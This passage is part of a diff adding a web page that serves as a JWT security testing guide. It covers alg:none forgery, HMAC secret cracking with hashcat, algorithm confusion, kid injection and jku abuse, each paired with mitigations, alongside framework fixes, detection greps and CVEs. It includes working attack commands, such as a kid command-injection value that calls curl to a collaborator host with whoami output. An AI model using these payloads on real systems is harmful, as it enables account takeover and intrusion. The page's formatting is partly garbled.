+<td><code>PS256</code>, <code>PS384</code>, <code>PS512</code></td>
+<td>Good modern option if implemented correctly</td>
+</tr>
+<tr>
+<td><strong>None</strong></td>
+<td><code>none</code></td>
+<td>Must be rejected — test it anyway</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="jwt-claims">
+  <strong>JWT Claims</strong>
+  <a class="anchor" href="#jwt-claims">#</a>
+</h3>
+<h4 id="1-registered-claim-names-standard-claims">
+  <strong>1. Registered Claim Names (Standard Claims)</strong>
+  <a class="anchor" href="#1-registered-claim-names-standard-claims">#</a>
+</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Claim</strong></th>
+<th><strong>Type</strong></th>
+<th><strong>What Testers Check</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>iss</code></td>
+<td>String/URI</td>
+<td>Is issuer strictly validated?</td>
+</tr>
+<tr>
+<td><code>sub</code></td>
+<td>String/URI</td>
+<td>Can user identity be tampered?</td>
+</tr>
+<tr>
+<td><code>aud</code></td>
+<td>String/URI or Array</td>
+<td>Token confusion across services</td>
+</tr>
+<tr>
+<td><code>exp</code></td>
+<td>NumericDate</td>
+<td>Long-lived tokens / ignored expiry</td>
+</tr>
+<tr>
+<td><code>nbf</code></td>
+<td>NumericDate</td>
+<td>Premature acceptance</td>
+</tr>
+<tr>
+<td><code>iat</code></td>
+<td>NumericDate</td>
+<td>Clock-skew abuse / replay windows</td>
+</tr>
+<tr>
+<td><code>jti</code></td>
+<td>String</td>
+<td>Reuse after logout / no revocation</td>
+</tr>
+</tbody>
+</table>
+<h4 id="2-public-claim-names">
+  <strong>2. Public Claim Names</strong>
+  <a class="anchor" href="#2-public-claim-names">#</a>
+</h4>
+<ul>
+<li>Shared ecosystem claims (<code>email</code>, <code>scope</code>, etc.)</li>
+<li>Must avoid collisions and trust assumptions</li>
+</ul>
+<h4 id="3-private-claim-names">
+  <strong>3. Private Claim Names</strong>
+  <a class="anchor" href="#3-private-claim-names">#</a>
+</h4>
+<ul>
+<li>
+<p>App-specific claims (<code>tenant_id</code>, <code>is_admin</code>, <code>internal_role</code>)</p>
+</li>
+<li>
+<p>High-risk when authorization trusts only claim values</p>
+</li>
+</ul>
+<hr>
+<h3 id="jose-header-parameters">
+  <strong>JOSE Header Parameters</strong>
+  <a class="anchor" href="#jose-header-parameters">#</a>
+</h3>
+<h4 id="common-jwsjwe-header-parameters">
+  <strong>Common JWS/JWE Header Parameters</strong>
+  <a class="anchor" href="#common-jwsjwe-header-parameters">#</a>
+</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Parameter</strong></th>
+<th><strong>Type</strong></th>
+<th><strong>Abuse Seen in Reports</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>alg</code></td>
+<td>String/URI</td>
+<td>Forced to <code>none</code> / swapped for confusion</td>
+</tr>
+<tr>
+<td><code>typ</code></td>
+<td>String</td>
+<td>Usually low impact alone</td>
+</tr>
+<tr>
+<td><code>cty</code></td>
+<td>String</td>
+<td>Nested token parsing confusion</td>
+</tr>
+<tr>
+<td><code>kid</code></td>
+<td>String</td>
+<td>SQLi, path traversal, command injection</td>
+</tr>
+<tr>
+<td><code>jku</code></td>
+<td>URI</td>
+<td>Key injection / SSRF</td>
+</tr>
+<tr>
+<td><code>jwk</code></td>
+<td>JWK</td>
+<td>Embedded attacker key trust</td>
+</tr>
+<tr>
+<td><code>x5u</code></td>
+<td>URI</td>
+<td>SSRF / malicious cert chain</td>
+</tr>
+<tr>
+<td><code>x5c</code></td>
+<td>Array</td>
+<td>Unsafe cert trust path</td>
+</tr>
+<tr>
+<td><code>x5t</code> / <code>x5t#S256</code></td>
+<td>String</td>
+<td>Thumbprint trust bypass checks</td>
+</tr>
+<tr>
+<td><code>crit</code></td>
+<td>Array</td>
+<td>Incorrect critical extension handling</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="common-jwt-vulnerabilities--attacks">
+  <strong>Common JWT Vulnerabilities &amp; Attacks</strong>
+  <a class="anchor" href="#common-jwt-vulnerabilities--attacks">#</a>
+</h2>
+<h3 id="1-signature-not-verified-decode-misuse">
+  <strong>1. Signature Not Verified (<code>decode()</code> misuse)</strong>
+  <a class="anchor" href="#1-signature-not-verified-decode-misuse">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: API parses token payload and never validates signature.</li>
+<li><strong>Exploit</strong>: Change <code>role=user</code> to <code>role=admin</code>, resend.</li>
+<li><strong>Impact</strong>: Auth bypass / privilege escalation.</li>
+<li><strong>Mitigation</strong>: Always perform strict signature verification before claim use.</li>
+</ul>
+<p><strong>Practical commands:</strong></p>
+<p>`# Decode without verifying (what the vulnerable server does internally)
+python3 jwt_tool.py <JWT> -M at</p>
+<h1 id="tamper-role-claim-and-resend--no-re-signing-needed-if-server-skips-verification">
+  Tamper role claim and resend — no re-signing needed if server skips verification
+  <a class="anchor" href="#tamper-role-claim-and-resend--no-re-signing-needed-if-server-skips-verification">#</a>
+</h1>
+<p>python3 jwt_tool.py <JWT> -T -pc role -pv admin`</p>
+<p><strong>HackerOne #2472798 (Newspack plugin):</strong> Signature validation was skipped completely on registration/login endpoints — not just alg:none, full omission. Test <strong>every</strong> endpoint, not just the main login flow.</p>
+<hr>
+<h3 id="2-alg-none-acceptance">
+  <strong>2. <code>alg: none</code> Acceptance</strong>
+  <a class="anchor" href="#2-alg-none-acceptance">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: Legacy library or custom parser accepts unsigned token.</li>
+<li><strong>Exploit</strong>: Remove signature, set <code>alg</code> to <code>none</code>.</li>
+<li><strong>Impact</strong>: Full account takeover.</li>
+<li><strong>Mitigation</strong>: Hard deny <code>none</code>; enforce fixed allowlist server-side.</li>
+</ul>
+<p><strong>Practical commands:</strong></p>
+<p>`# Method 1: jwt_tool (easiest)
+python3 jwt_tool.py <JWT> -X a</p>
+<h1 id="method-2-manual-build">
+  Method 2: Manual build
+  <a class="anchor" href="#method-2-manual-build">#</a>
+</h1>
+<p>header=$(echo -n &lsquo;{&ldquo;alg&rdquo;:&ldquo;none&rdquo;,&ldquo;typ&rdquo;:&ldquo;JWT&rdquo;}&rsquo; | base64 | tr -d &lsquo;=&rsquo; | tr &lsquo;+/&rsquo; &lsquo;-<em>&rsquo;)
+payload=$(echo -n &lsquo;{&ldquo;sub&rdquo;:&ldquo;admin&rdquo;,&ldquo;role&rdquo;:&ldquo;admin&rdquo;}&rsquo; | base64 | tr -d &lsquo;=&rsquo; | tr &lsquo;+/&rsquo; &lsquo;-</em>&rsquo;)
+echo &ldquo;${header}.${payload}.&rdquo;</p>
+<h1 id="note-the-trailing-dot--empty-signature">
+  Note the trailing dot — empty signature
+  <a class="anchor" href="#note-the-trailing-dot--empty-signature">#</a>
+</h1>
+<h1 id="also-try-case-variants--weak-denylists-are-case-sensitive">
+  Also try case variants — weak denylists are case-sensitive:
+  <a class="anchor" href="#also-try-case-variants--weak-denylists-are-case-sensitive">#</a>
+</h1>
+<h1 id="none-none-none">
+  &ldquo;nOnE&rdquo;, &ldquo;None&rdquo;, &ldquo;NONE&rdquo;`
+  <a class="anchor" href="#none-none-none">#</a>
+</h1>
+<p><strong>What to modify in the payload:</strong></p>
+<ul>
+<li><code>&quot;role&quot;: &quot;admin&quot;</code> or <code>&quot;is_admin&quot;: true</code> → privilege escalation</li>
+<li>Change <code>&quot;sub&quot;</code> to another user&rsquo;s ID → account takeover</li>
+<li>Remove <code>&quot;exp&quot;</code> entirely → token never expires</li>
+</ul>
+<hr>
+<h3 id="3-weak-hmac-secret">
+  <strong>3. Weak HMAC Secret</strong>
+  <a class="anchor" href="#3-weak-hmac-secret">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: Default/shared secrets (<code>secret</code>, env leak, repo leak).</li>
+<li><strong>Exploit</strong>: Crack with <code>hashcat -m 16500</code>, re-sign elevated claims.</li>
+<li><strong>Impact</strong>: Token forgery at scale.</li>
+<li><strong>Mitigation</strong>: 256-bit random secrets, KMS storage, rotation.</li>
+</ul>
+<p><strong>Practical commands:</strong></p>
+<p>`# Export the JWT to a file
+echo -n &rsquo;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.abc123&rsquo; &gt; jwt.txt</p>
+<h1 id="dictionary-attack-fastest">
+  Dictionary attack (fastest)
+  <a class="anchor" href="#dictionary-attack-fastest">#</a>
+</h1>
+<p>hashcat -a 0 -m 16500 jwt.txt /opt/seclists/Passwords/scraped-JWT-secrets.txt</p>
+<h1 id="rule-based-catches-variations-like-secret1">
+  Rule-based (catches variations like Secret1!)
+  <a class="anchor" href="#rule-based-catches-variations-like-secret1">#</a>
+</h1>
+<p>hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r rules/best64.rule</p>
+<h1 id="brute-force-short-secrets">
+  Brute-force short secrets
+  <a class="anchor" href="#brute-force-short-secrets">#</a>
+</h1>
+<p>hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a?a?a -i &ndash;increment-min=4</p>
+<h1 id="once-cracked--re-sign-with-jwt_tool">
+  Once cracked — re-sign with jwt_tool
+  <a class="anchor" href="#once-cracked--re-sign-with-jwt_tool">#</a>
+</h1>
+<p>python3 jwt_tool.py <JWT> -T -S hs256 -p &lsquo;cracked_secret&rsquo;`</p>
+<p><strong>Wordlists :</strong></p>
+<ol>
+<li><code>scraped-JWT-secrets.txt</code> (SecLists) — JWT-specific</li>
+<li>github.com/wallarm/jwt-secrets — 340 known weak JWT secrets</li>
+<li><code>rockyou.txt</code> — classic fallback</li>
+</ol>
+<p><strong>Where weak secrets come from — check all of these:</strong></p>
+<ul>
+<li>GitHub dork: <code>JWT_SECRET site:github.com</code> or <code>&quot;jwt_secret&quot; .env</code></li>
+<li>Hardcoded in mobile app binaries — reverse with jadx/apktool</li>
+<li>Default framework values: Express uses <code>'secret'</code> in many tutorials</li>
+<li>Env variable leaks in debug responses or error messages</li>
+</ul>
+<hr>
+<h3 id="4-rsaecdsa--hmac-algorithm-confusion">
+  <strong>4. RSA/ECDSA → HMAC Algorithm Confusion</strong>
+  <a class="anchor" href="#4-rsaecdsa--hmac-algorithm-confusion">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: Backend trusts token <code>alg</code>; uses public key as HMAC secret.</li>
+<li><strong>Exploit</strong>: Switch <code>RS256/ES256</code> to <code>HS256</code>, sign using known public key.</li>
+<li><strong>Impact</strong>: Auth bypass.</li>
+<li><strong>Mitigation</strong>: Bind algorithm and key type in server config, not token input.</li>
+</ul>
+<p><strong>Practical commands:</strong></p>
+<p>`# Step 1: Get the server&rsquo;s public key
+curl <a href="https://target.com/.well-known/jwks.json" target="_blank" rel="noreferrer noopener nofollow">https://target.com/.well-known/jwks.json</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<h1 id="or-extract-from-tls-cert">
+  OR extract from TLS cert
+  <a class="anchor" href="#or-extract-from-tls-cert">#</a>
+</h1>
+<p>openssl s_client -connect target.com:443 2&gt;/dev/null <br>
+| sed -n &lsquo;/BEGIN/,/END/p&rsquo; &gt; chain.pem
+openssl x509 -pubkey -in chain.pem -noout &gt; pubkey.pem</p>
+<h1 id="step-2-if-no-jwks-exposed-recover-public-key-from-2-jwts">
+  Step 2: If no JWKS exposed, recover public key from 2 JWTs
+  <a class="anchor" href="#step-2-if-no-jwks-exposed-recover-public-key-from-2-jwts">#</a>
+</h1>
+<p>docker run &ndash;rm -it portswigger/sig2n <token1> <token2></p>
+<h1 id="outputs-4-candidate-keys--try-all-4">
+  Outputs 4 candidate keys — try all 4
+  <a class="anchor" href="#outputs-4-candidate-keys--try-all-4">#</a>
+</h1>
+<h1 id="step-3-burp-jwt-editor">
+  Step 3: Burp JWT Editor
+  <a class="anchor" href="#step-3-burp-jwt-editor">#</a>
+</h1>
+<h1 id="-import-rsa-public-key--attack--hmac-key-confusion-attack">
+  → Import RSA public key → Attack → HMAC Key Confusion Attack
+  <a class="anchor" href="#-import-rsa-public-key--attack--hmac-key-confusion-attack">#</a>
+</h1>
+<h1 id="step-4-jwt_tool">
+  Step 4: jwt_tool
+  <a class="anchor" href="#step-4-jwt_tool">#</a>
+</h1>
+<p>python3 jwt_tool.py <JWT> -X k -pk pubkey.pem`</p>
+<hr>
+<h3 id="5-kid-injection">
+  <strong>5. <code>kid</code> Injection</strong>
+  <a class="anchor" href="#5-kid-injection">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: <code>kid</code> concatenated into SQL/file path/shell command.</li>
+<li><strong>Exploit ideas</strong>: Path traversal, SQLi, command injection.</li>
+<li><strong>Impact</strong>: Bypass + possible RCE/SSRF/data access.</li>
+<li><strong>Mitigation</strong>: Opaque key IDs, strict regex, parameterized lookups.</li>
+</ul>
+<p><strong>Path traversal via kid:</strong></p>
+<p><code># Goal: point kid to /dev/null → HMAC secret = empty string</code></p>
+<p>`# Modified header: {&ldquo;alg&rdquo;:&ldquo;HS256&rdquo;,&ldquo;typ&rdquo;:&ldquo;JWT&rdquo;,&ldquo;kid&rdquo;:&quot;../../../../../../dev/null&quot;}</p>
+<p>python3 jwt_tool.py <JWT> -I -hc kid -hv &lsquo;../../../../../../dev/null&rsquo; -S hs256 -p '&rsquo;</p>
+<h1 id="other-targets">
+  Other targets:
+  <a class="anchor" href="#other-targets">#</a>
+</h1>
+<h1 id="procsyskernelrandomize_va_space">
+  /proc/sys/kernel/randomize_va_space
+  <a class="anchor" href="#procsyskernelrandomize_va_space">#</a>
+</h1>
+<h1 id="etchostname-if-you-know-it">
+  /etc/hostname (if you know it)`
+  <a class="anchor" href="#etchostname-if-you-know-it">#</a>
+</h1>
+<p><strong>SQL injection via kid:</strong></p>
+<p>`# Query pattern: SELECT key FROM keys WHERE id = &lsquo;<kid>&rsquo;</p>
+<h1 id="inject-kidx-union-select-attacker_key--">
+  Inject: {&ldquo;kid&rdquo;:&ldquo;x&rsquo; UNION SELECT &lsquo;attacker_key&rsquo;&ndash;&rdquo;}
+  <a class="anchor" href="#inject-kidx-union-select-attacker_key--">#</a>
+</h1>
+<h1 id="then-sign-jwt-with-attacker_key-as-the-hs256-secret">
+  Then sign JWT with &lsquo;attacker_key&rsquo; as the HS256 secret
+  <a class="anchor" href="#then-sign-jwt-with-attacker_key-as-the-hs256-secret">#</a>
+</h1>
+<h1 id="fuzz-kid-with-jwt_tool">
+  Fuzz kid with jwt_tool
+  <a class="anchor" href="#fuzz-kid-with-jwt_tool">#</a>
+</h1>
+<p>python3 jwt_tool.py -t <a href="https://target.com/api" target="_blank" rel="noreferrer noopener nofollow">https://target.com/api</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> -rc &lsquo;jwt=<TOKEN>&rsquo; <br>
+-I -hc kid -hv payloads.txt`</p>
+<p><strong>Command injection via kid:</strong></p>
+<p><code>{&quot;kid&quot;:&quot;/dev/null; curl https://your.burpcollaborator.net/$(whoami)&quot;}</code></p>
+<p>Blind — check Burp Collaborator for DNS/HTTP pings.</p>
+<hr>
+<h3 id="6-jku--x5u-remote-key-fetch-abuse">
+  <strong>6. <code>jku</code> / <code>x5u</code> Remote Key Fetch Abuse</strong>
+  <a class="anchor" href="#6-jku--x5u-remote-key-fetch-abuse">#</a>
+</h3>
+<ul>
+<li><strong>Pattern</strong>: Verifier fetches keys from attacker URL.</li>
+<li><strong>Exploit</strong>: Host malicious JWKS and sign with matching private key.</li>
+<li><strong>Impact</strong>: Forged tokens, SSRF.</li>
+<li><strong>Mitigation</strong>: Disable dynamic fetch or enforce hard allowlist + TLS pinning.</li>
+</ul>
+<p><strong>Practical commands:</strong></p>
+<p>`# Step 1: Generate your own RSA key pair
+openssl genrsa -out attacker_private.pem 2048
+openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem</p>
+<h1 id="step-2-build-jwksjson-and-host-it">
+  Step 2: Build jwks.json and host it
+  <a class="anchor" href="#step-2-build-jwksjson-and-host-it">#</a>
+</h1>
+<h1 id="keysktyrsausesigkidattacker-key-1nmoduluseaqab">
+  {&ldquo;keys&rdquo;:[{&ldquo;kty&rdquo;:&ldquo;RSA&rdquo;,&ldquo;use&rdquo;:&ldquo;sig&rdquo;,&ldquo;kid&rdquo;:&ldquo;attacker-key-1&rdquo;,&ldquo;n&rdquo;:&quot;<modulus>&quot;,&ldquo;e&rdquo;:&ldquo;AQAB&rdquo;}]}
+  <a class="anchor" href="#keysktyrsausesigkidattacker-key-1nmoduluseaqab">#</a>
+</h1>
+<p>python3 -m http.server 8080</p>
+<h1 id="step-3-modified-jwt-header">
+  Step 3: Modified JWT header
+  <a class="anchor" href="#step-3-modified-jwt-header">#</a>
+</h1>
+<h1 id="algrs256jkuhttpsyour-servercomjwksjsonkidattacker-key-1">
+  {&ldquo;alg&rdquo;:&ldquo;RS256&rdquo;,&ldquo;jku&rdquo;:&ldquo;<a href="https://your-server.com/jwks.json%22,%22kid%22:%22attacker-key-1%22%7d" target="_blank" rel="noreferrer noopener nofollow">https://your-server.com/jwks.json","kid":"attacker-key-1"}</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+  <a class="anchor" href="#algrs256jkuhttpsyour-servercomjwksjsonkidattacker-key-1">#</a>
+</h1>
+<h1 id="step-4-sign-with-jwt_tool">
+  Step 4: Sign with jwt_tool
+  <a class="anchor" href="#step-4-sign-with-jwt_tool">#</a>
+</h1>
+<p>python3 jwt_tool.py <JWT> -X s -ju &lsquo;<a href="https://your-server.com/jwks.json%27" target="_blank" rel="noreferrer noopener nofollow">https://your-server.com/jwks.json'</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<h1 id="burp-shortcut">
+  Burp shortcut:
+  <a class="anchor" href="#burp-shortcut">#</a>
+</h1>
+<h1 id="jwt-editor--attack--embedded-jwk-hosts-jwks-automatically">
+  JWT Editor → Attack → Embedded JWK (hosts JWKS automatically)
+  <a class="anchor" href="#jwt-editor--attack--embedded-jwk-hosts-jwks-automatically">#</a>
+</h1>
+<h3 id="embedded-jwk-trust-cve-2018-0114-class">
+  Embedded <code>jwk</code> Trust (CVE-2018-0114 class)**
+  <a class="anchor" href="#embedded-jwk-trust-cve-2018-0114-class">#</a>
+</h3>
+<p><strong>Practical steps:</strong></p>
+<pre tabindex="0"><code>1. Burp JWT Editor → Keys tab → Generate new RSA key
+2. Repeater → JWT tab → Attack → Embedded JWK
+3. Modify payload claims (role, sub, etc.)
+4. Send — check if server accepts it`
+
+---
+
+### **8. Replay / Token Reuse**
+
+- **Pattern**: Old tokens still valid after logout/password reset.
+- **Exploit**: Reuse stolen access token.
+- **Impact**: Persistent session hijack.
+- **Mitigation**: Short `exp`, refresh rotation, `jti` denylist, event-based revocation.
+
+**How to test:**
+
+`# Step 1: Log in, copy your JWT
+# Step 2: Log out through the UI
+# Step 3: Replay the old token
+curl -H &#39;Authorization: Bearer &lt;OLD_JWT&gt;&#39; https://target.com/api/profile
+
+# Also test after: password reset, email change, role change, account deletion`
+
+---
+
+### **9. Sensitive Data Exposure in Payload**
+
+- **Pattern**: PII/API keys/internal flags inside JWT body.
+- **Exploit**: Read token client-side or from logs/proxies.
+- **Impact**: Data leakage/compliance violations.
+- **Mitigation**: Minimize claims; use JWE only when confidentiality required.
+
+**Quick check:**
+
+`# Decode payload without any tools
+echo &#39;eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0&#39; | base64 -d 2&gt;/dev/null
+# Look for: email, phone, SSN, API keys, is_admin, internal_role, tenant_id`
+
+---
+
+### **10. SSO Redirect Leaks**
+
+- **Pattern**: Open redirect in auth callback leaks JWT to attacker domain.
+- **Exploit**: Craft malicious redirect URI.
+- **Impact**: Token theft and account compromise.
+- **Mitigation**: Strict redirect URI allowlist + exact match validation.
+
+---
+
+## **Attack Surfaces &amp; Real-World Scenarios**
+
+### **1. Microservice Token Confusion**
+
+- One token valid across user/admin/internal APIs due to weak `aud`/`iss` checks.
+- Test: replay a user-service token against `/admin-service/api/...`
+
+### **2. SPA Token Storage**
+
+- JWT in `localStorage` stolen via XSS, then replayed against APIs.
+- Test: check where token is stored — localStorage = escalate XSS to full account takeover
+
+### **3. Mobile/API Key Exposure**
+
+- Hardcoded HMAC secret in app binary enables offline token forging.
+- Test: reverse APK with jadx/apktool, grep for `secret`, `key`, `jwt`
+
+### **4. CI/CD and Logs Leakage**
+
+- JWTs exposed in debug logs, crash reports, or telemetry exports.
+- Test: check `/debug`, `/logs`, error responses, Sentry-style dashboards
+
+### **5. Multi-Tenant Authorization Bypass**
+
+- `tenant_id` claim modified and accepted without server-side ownership checks.
+- Test: decode JWT, change `tenant_id` to another org&#39;s ID, re-sign if HS256, replay
+
+---
+
+## **Bypassing Defenses: Encoding &amp; Obfuscation**
+
+| **Technique** | **Example** | **JWT Testing Goal** |
+| --- | --- | --- |
+| `alg` case tricks | `nOnE`, `None` | Weak denylist bypass |
+| Missing signature | `header.payload.` | Verify strict parser behavior |
+| Duplicated claims | `{&#34;role&#34;:&#34;user&#34;,&#34;role&#34;:&#34;admin&#34;}` | Parser ambiguity checks |
+| JSON whitespace/order tricks | altered header formatting | Signature/normalization edge cases |
+| Unicode/escaped values | `&#34;r\u006Fle&#34;:&#34;admin&#34;` | Input validation bypass testing |
+| Header parameter smuggling | add `jwk` + `jku` together | Confused key selection logic |
+
+---
+
+## **Framework-Specific Vulnerabilities**
+
+### **1. Node.js (`jsonwebtoken`)**
+
+- **Common issue:** `jwt.decode()` trusted for auth logic.
+- **Fix:** `jwt.verify(token, key, { algorithms: [...] })` and strict claim validation.
+
+`// Misconfigured : skips signature verification entirely
+const payload = jwt.decode(token);
+
+// Misconfigured : no algorithm pinned, trusts token&#39;s alg
+jwt.verify(token, publicKey);
+
+// CORRECT
+jwt.verify(token, publicKey, { algorithms: [&#39;RS256&#39;] });`
+
+### **2. Python (`PyJWT`)**
+
+- **Common issue:** insecure decode flags / weak key handling.
+- **Fix:** explicit algorithms, verify issuer/audience, pin keys.
+
+`# Misconfigured : algorithms not specified
+jwt.decode(token, key)
+
+# Misconfigured : verification disabled
+jwt.decode(token, options={&#39;verify_signature&#39;: False})
+
+# CORRECT
+jwt.decode(token, key, algorithms=[&#39;RS256&#39;], audience=&#39;my-service&#39;)`
+
+### **3. Java (`jjwt`, Nimbus, JDK stack)**
+
+- **Common issue:** outdated crypto runtime (e.g., ECDSA verification bugs in older Java).
+- **Fix:** patch JDK/libs, strict key selection, disable dangerous JOSE headers.
+
+`// Misconfigured : no signature verification
+Jwts.parser().parseClaimsJwt(token);
+
+// Misconfigured : trusting attacker-controlled alg header
+String alg = header.getAlgorithm();
+
+// CORRECT
+Jwts.parserBuilder()
+    .setSigningKey(key)
+    .requireAudience(&#34;api&#34;)
+    .build()
+    .parseClaimsJws(token);`
+
+### **4. .NET (`System.IdentityModel.Tokens.Jwt`)**
+
+- **Common issue:** lax `TokenValidationParameters`.
+- **Fix:** require signing key, issuer, audience, lifetime, and clock skew control.
+
+`// Misconfigured : validation disabled
+tokenHandler.ValidateToken(token, new TokenValidationParameters {
+    ValidateSignature = false
+}, out _);
+
+// CORRECT
+tokenHandler.ValidateToken(token, new TokenValidationParameters {
+    ValidateIssuerSigningKey = true,
+    IssuerSigningKey = signingKey,
+    ValidateIssuer = true,
+    ValidIssuer = &#34;https://your-issuer.com&#34;,
+    ValidateAudience = true,
+    ValidAudience = &#34;your-api&#34;,
+    ValidateLifetime = true
+}, out _);`
+
+---
+
+## **Security Issues (JWS)**
+
+- Accepting `none` or malformed algorithm values
+- Signature omitted but token still accepted
+- Weak/shared HMAC secrets
+- Algorithm/key confusion (RS/ES → HS)
+- Dangerous dynamic key resolution (`kid`, `jku`, `jwk`, `x5u`)
+- Missing claim validation (`iss`, `aud`, `exp`, `nbf`, `jti`)
+- Non-constant-time comparisons in custom validators
+
+---
+
+## **Security Issues (JWE)**
+
+- Unsafe encryption choices or legacy modes
+- Decrypting JWE but skipping nested JWS verification
+- Key management mistakes (wrong key use, weak rotation)
+- Vulnerable library versions (padding oracle style issues)
+
+---
+
+## **Security Issues**
+
+- `kid` used in DB/file/system command without sanitization
+- `jku`/`x5u` remote fetch without allowlist or network controls
+- Trusting token-provided keys over server trust store
+- Cross-JWT substitution between services/apps
+- Replay due to long validity and no revocation model
+
+---
+
+## **Detection Techniques**
+
+### **Manual Testing Workflow**
+
+1. Capture token from authenticated request.
+2. Decode and map auth-critical claims (`role`, `scope`, `tenant`, `aud`).
+3. Try signature bypasses (`none`, missing signature, alg switch).
+4. Probe header injections (`kid`, `jku`, `jwk`, `x5u`).
+5. Test replay after logout/password reset/role change.
+6. Test cross-service token reuse and audience confusion.
+
+### **Automated  Testing**
+
+- Burp JWT Editor / Repeater macros
+- `jwt_tool` for alg confusion, key tests, and tampering
+- `hashcat` mode 16500 for HMAC secret strength checks
+- Custom scripts for replay timing and revocation validation
+
+### **Code Review Targets**
+
+`# Find decode-only calls
+grep -rn &#39;jwt.decode\|parseClaimsJwt\|verify_signature.*False&#39; \
+  --include=&#39;*.js&#39; --include=&#39;*.py&#39; .
+
+# Find kid concatenation into queries/paths
+grep -rn &#39;kid&#39; . | grep -E &#39;\+.*kid|kid.*\+|f&#34;.*kid|format.*kid&#39;
+
+# Find algorithm not pinned
+grep -rn &#39;jwt.verify&#39; . | grep -v &#39;algorithms&#39;
+
+# Semgrep scan
+semgrep --config &#39;p/jwt&#39; .`
+
+---
+
+## **Impact of JWT Attacks**
+
+- A forged admin token via algorithm confusion or `alg:none` bypass gives full unauthorized access to any account or admin panel — no credentials needed.
+- Weak HMAC secrets cracked offline let attackers mint unlimited valid tokens for any user, at any privilege level, without touching the server.
+- `kid` injection into SQL or file paths turns an auth bypass into SQLi, LFI, or RCE — the JWT is just the entry point.
+- `jku`/`jwk` header abuse chains into SSRF, letting attackers probe internal cloud metadata services or internal APIs.
+- Tokens that survive logout or password reset give an attacker persistent access even after the victim has taken defensive action.
+- Sensitive PII or internal flags in the payload are readable by anyone who intercepts the token — base64 is not encryption.
+- JWTs passed as URL parameters leak into server logs, browser history, and `Referer` headers — silent, long-lasting exposure.
+- Cross-service audience confusion lets a low-privilege token issued for one service authenticate against a higher-privilege service in the same infrastructure.
+
+---
+
+## **Prevention Techniques**
+
+- Always verify the signature first, then validate claims, then authorize — never the other way around. Use `verify()`, never `decode()`.
+- Pin the allowed algorithm in server config, not in the token itself — `{ algorithms: [&#39;RS256&#39;] }`. Never trust the `alg` field from the token.
+- Use minimum 256-bit random secrets for HS256. Store all keys in KMS or HSM — never in `.env` files committed to repos.
+- Treat `kid`, `jku`, `jwk`, and `x5u` as untrusted attacker-controlled input. Never concatenate `kid` into SQL queries or file paths.
+- If remote JWKS fetch is needed, enforce a hard server-side allowlist of permitted URLs — disable it entirely if not required.
+- Enforce `iss`, `aud`, `exp`, and `nbf` on every token. Use `jti` with a server-side denylist wherever replay after logout matters.
+- Keep access tokens short-lived (15 minutes) with rotating refresh tokens. Revoke on logout, password reset, and risk events.
+- Store JWTs in `HttpOnly`, `Secure`, `SameSite=Strict` cookies — never in `localStorage`. Never pass JWTs as URL parameters.
+
+---
+
+## **Tools for JWT Security Testing**
+
+| **Tool** | **Practical Use** |
+| --- | --- |
+| [jwt.io](https://jwt.io/) | Quick decode/debug (not a trust oracle) |
+| Burp Suite JWT Editor | Header/payload tampering and resigning tests |
+| [jwt_tool](https://github.com/ticarpi/jwt_tool) | Automated JWT attack checks |
+| [hashcat](https://hashcat.net/hashcat/) | HMAC secret brute-force strength assessment |
+| CyberChef | Base64url transforms and payload crafting |
+| OWASP ZAP scripts | Automated API JWT misuse checks |
+| portswigger/sig2n | Recover RSA public key from 2 JWTs |
+
+### **jwt_tool :**
+
+`# Run ALL tests at once (green = vulnerable)
+python3 jwt_tool.py &lt;JWT&gt; -M at
+
+# alg:none
+python3 jwt_tool.py &lt;JWT&gt; -X a
+
+# Algorithm confusion (RS256→HS256)
+python3 jwt_tool.py &lt;JWT&gt; -X k -pk pubkey.pem
+
+# jku injection
+python3 jwt_tool.py &lt;JWT&gt; -X s -ju &#39;https://your-server.com/jwks.json&#39;
+
+# Modify a claim
+python3 jwt_tool.py &lt;JWT&gt; -T -pc role -pv admin
+
+# Fuzz kid header
+python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv payloads.txt
+
+# Crack HMAC secret
+python3 jwt_tool.py &lt;JWT&gt; -C -d /opt/seclists/Passwords/scraped-JWT-secrets.txt`
+
+---
+
+## **Good to read &amp; CVEs**
+
+| **CVE** | **Affected** | **What Happened** | **Impact** |
+| --- | --- | --- | --- |
+| CVE-2018-0114 | cisco-node-jose, jose2go, Nimbus | Trusted embedded `jwk` in token header | Auth bypass |
+| CVE-2022-21449 | Java 15–18 (ECDSA) | Blank ECDSA signature accepted (&#34;psychic paper&#34;) | Auth bypass |
+| CVE-2022-29217 | PyJWT &lt;2.4.0 | ECDSA key accepted as HMAC secret | Alg confusion |
+| CVE-2024-54150 | cjwt library | `alg` from header trusted → RS→HS confusion | Auth bypass |
+| HackerOne #1889161 | Argo CD | `aud` not validated → any OIDC token accepted | Auth bypass |
+| HackerOne #2472798 | Newspack plugin | Signature verification omitted on registration | Account takeover |
+
+## **References :**
+
+- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
+- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
+- [OWASP WSTG JWT Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)
+- https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
